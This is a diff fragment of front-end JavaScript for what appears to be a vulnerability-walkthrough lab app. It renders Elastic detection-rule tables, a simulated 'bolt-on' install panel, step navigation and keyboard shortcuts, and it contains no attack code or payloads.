+                    <a href="${r.url}" class="bw-det__link" data-gh-url onclick="event.preventDefault();console.log('Would open ${r.url}');">github.com/elastic/detection-rules</a>
+                    <button class="bw-det__copy" type="button" data-copy-url="${escapeHtml(r.url)}">Copy URL</button>
+                </div>
+            </td>
+        </tr>
+    `).join('');
+
+    wrap.innerHTML = `
+        <span class="bw-det__cov ${covClass}">${covLabel}</span>
+        <p class="bw-det__intro">Detection coverage for <strong>${escapeHtml(v.name)}</strong>. Each rule below maps to a published Elastic detection. UUIDs are referenceable in your Elastic Security UI.</p>
+        <table class="bw-det__table">
+            <thead>
+                <tr>
+                    <th>Rule name</th>
+                    <th>UUID</th>
+                    <th>Coverage</th>
+                    <th>Source</th>
+                </tr>
+            </thead>
+            <tbody>${rowsHtml}</tbody>
+        </table>
+        <div class="bw-det__kql">
+            <span class="bw-det__kql-head">Highest-fidelity KQL query</span>
+            ${buildCmdBlockHtml(v.detection.kql, `det-${v.slug}-kql`)}
+        </div>
+    `;
+
+    // Wire copy-URL buttons
+    wrap.querySelectorAll('[data-copy-url]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const url = btn.getAttribute('data-copy-url');
+            const old = btn.textContent;
+            copyToClipboard(url, null);
+            btn.classList.add('is-copied');
+            btn.textContent = '✓ Copied';
+            setTimeout(() => { btn.classList.remove('is-copied'); btn.textContent = old; }, 1500);
+        });
+    });
+    setTimeout(() => wireCopyButtons(wrap), 0);
+
+    return wrap;
+}
+
+/* ─── INSTALL TAB ────────────────────────────────────────────────────── */
+
+function buildInstallView(v) {
+    const wrap = document.createElement('div');
+    wrap.className = 'bw-install bw-step-anim';
+    const pv = perVuln(v.id);
+
+    const stateLabel = pv.installState === 'not_installed'
+        ? '○ Not installed'
+        : pv.installState === 'installing' ? '◐ Installing…' : '● Installed';
+    const stateCls = pv.installState === 'not_installed'
+        ? 'bw-install__state--not'
+        : pv.installState === 'installing' ? 'bw-install__state--installing' : 'bw-install__state--installed';
+
+    let btnLabel, btnAction;
+    if (pv.installState === 'not_installed') { btnLabel = '▶ Install bolt-on'; btnAction = 'install'; }
+    else if (pv.installState === 'installing') { btnLabel = '… Installing'; btnAction = 'none'; }
+    else { btnLabel = '✕ Uninstall'; btnAction = 'uninstall'; }
+
+    wrap.innerHTML = `
+        <div class="bw-install__card">
+            <span class="bw-install__state ${stateCls}">
+                <span class="bw-install__state-dot" aria-hidden="true"></span>${stateLabel}
+            </span>
+            <p class="bw-install__info">${escapeHtml(v.install.sideEffects)}.</p>
+            ${pv.installState === 'installing' ? `<div class="bw-install__bar"><div class="bw-install__bar-fill" id="installBar" style="width:${pv.installProgress}%"></div></div>` : ''}
+            <div class="bw-install__info-row"><span class="k">Ansible role</span><span class="v">${escapeHtml(v.install.ansibleRole)}</span></div>
+            <div class="bw-install__info-row"><span class="k">Est. time</span><span class="v">${v.install.estSeconds}s</span></div>
+            <div class="bw-install__info-row"><span class="k">Detectability</span><span class="v">${escapeHtml(v.install.detectability)}</span></div>
+            <div class="bw-install__info-row"><span class="k">Target</span><span class="v">${escapeHtml(v.target)}</span></div>
+            <div style="display:flex;gap:8px;margin-top:16px;">
+                <button id="installBtn" class="bw-btn ${pv.installState === 'installed' ? '' : 'bw-btn--primary'}" type="button" ${btnAction === 'none' ? 'disabled' : ''}>${btnLabel}</button>
+            </div>
+        </div>
+    `;
+
+    const btn = wrap.querySelector('#installBtn');
+    if (btn && btnAction !== 'none') {
+        btn.addEventListener('click', () => {
+            if (btnAction === 'install') startInstall(v.id);
+            else if (btnAction === 'uninstall') {
+                pv.installState = 'not_installed';
+                pv.installProgress = 0;
+                saveState();
+                renderBodyCol();
+            }
+        });
+    }
+
+    // Animate progress if installing
+    if (pv.installState === 'installing') {
+        const bar = wrap.querySelector('#installBar');
+        if (bar) {
+            requestAnimationFrame(() => {
+                bar.style.width = '100%';
+            });
+        }
+    }
+
+    return wrap;
+}
+
+function startInstall(vulnId) {
+    const pv = perVuln(vulnId);
+    pv.installState = 'installing';
+    pv.installProgress = 0;
+    saveState();
+    renderBodyCol();
+    setTimeout(() => {
+        pv.installState = 'installed';
+        pv.installProgress = 100;
+        saveState();
+        renderCatalog();
+        renderBodyCol();
+    }, 1500);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   NAVIGATION
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function goToStep(idx) {
+    if (!state.selectedVulnId) return;
+    const v = vulnById(state.selectedVulnId);
+    if (!v) return;
+    const clamped = Math.max(0, Math.min(v.steps.length - 1, idx));
+    const pv = perVuln(v.id);
+    pv.currentStepIndex = clamped;
+    state.activeTab = 'walkthrough';
+    cancelAutoAdvance();
+    saveState();
+    renderWalkthrough();
+    // Scroll body to top
+    const body = document.querySelector('.bw-walk__body');
+    if (body) body.scrollTop = 0;
+}
+
+function toggleStepComplete(vulnId, stepId, stepIdx) {
+    const pv = perVuln(vulnId);
+    const v = vulnById(vulnId);
+    const isComplete = pv.completedSteps.includes(stepId);
+    if (isComplete) {
+        pv.completedSteps = pv.completedSteps.filter(id => id !== stepId);
+    } else {
+        pv.completedSteps.push(stepId);
+    }
+    saveState();
+    renderStepRail();
+    renderCatalog();
+    renderBodyCol();
+
+    // Auto-advance 400ms after marking complete (only if just completed, not last step)
+    if (!isComplete && stepIdx < v.steps.length - 1) {
+        cancelAutoAdvance();
+        autoAdvanceTimer = setTimeout(() => {
+            // Re-check still selected + complete
+            const p = perVuln(vulnId);
+            if (state.selectedVulnId === vulnId && p.completedSteps.includes(stepId)) {
+                goToStep(stepIdx + 1);
+            }
+        }, 400);
+    }
+}
+
+function cancelAutoAdvance() {
+    if (autoAdvanceTimer) { clearTimeout(autoAdvanceTimer); autoAdvanceTimer = null; }
+}
+
+function backToCatalog() {
+    state.selectedVulnId = null;
+    saveState();
+    renderCatalog();
+    renderWalkthrough();
+}
+
+function resetProgress() {
+    if (!state.selectedVulnId) return;
+    if (!confirm('Reset all completed steps and assessment answers for this walkthrough?')) return;
+    const pv = perVuln(state.selectedVulnId);
+    pv.completedSteps = [];
+    pv.assessmentAnswers = {};
+    pv.currentStepIndex = 0;
+    saveState();
+    renderWalkthrough();
+    renderCatalog();
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   KEYBOARD SHORTCUTS
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function initKeyboard() {
+    document.addEventListener('keydown', (e) => {
+        // Ignore when typing in inputs
+        const tag = (e.target.tagName || '').toLowerCase();
+        if (tag === 'input' || tag === 'textarea' || tag === 'select') return;
+        // Modal open? Esc closes it
+        const modal = document.getElementById('bwKbdModal');
+        if (modal.classList.contains('is-open')) {
+            if (e.key === 'Escape' || e.key === '?') { closeKbdModal(); e.preventDefault(); }
+            return;
+        }
+
+        const v = state.selectedVulnId ? vulnById(state.selectedVulnId) : null;
+        const pv = v ? perVuln(v.id) : null;
+
+        if (e.key === 'ArrowRight') {
+            if (v && pv) { goToStep(pv.currentStepIndex + 1); e.preventDefault(); }
+        } else if (e.key === 'ArrowLeft') {
+            if (v && pv) { goToStep(pv.currentStepIndex - 1); e.preventDefault(); }
+        } else if (e.key === ' ' || e.code === 'Space') {
+            if (v && pv) {
+                const step = v.steps[pv.currentStepIndex];
+                toggleStepComplete(v.id, step.id, pv.currentStepIndex);
+                e.preventDefault();
+            }
+        } else if (e.key === 'Escape') {
+            backToCatalog();
+        } else if (e.key === '?' || (e.key === '/' && e.shiftKey)) {
+            openKbdModal();
+            e.preventDefault();
+        }
+    });
+
+    document.getElementById('kbdModalClose').addEventListener('click', closeKbdModal);
+    document.getElementById('bwKbdModal').addEventListener('click', (e) => {
+        if (e.target.id === 'bwKbdModal') closeKbdModal();
+    });
+}
+
+function openKbdModal() {
+    document.getElementById('bwKbdModal').classList.add('is-open');
+}
+
+function closeKbdModal() {
+    document.getElementById('bwKbdModal').classList.remove('is-open');
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   UTILITIES
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function escapeHtml(str) {
+    if (str == null) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+   BOOT
+   ═══════════════════════════════════════════════════════════════════════ */
+
+document.addEventListener('DOMContentLoaded', () => {
+    initSplit();
+    initCatalogControls();
+    initKeyboard();
+    renderCatalog();
+    renderWalkthrough();
+    document.getElementById('resetProgress').addEventListener('click', resetProgress);
+});
+</script>
 </body>
 </html>
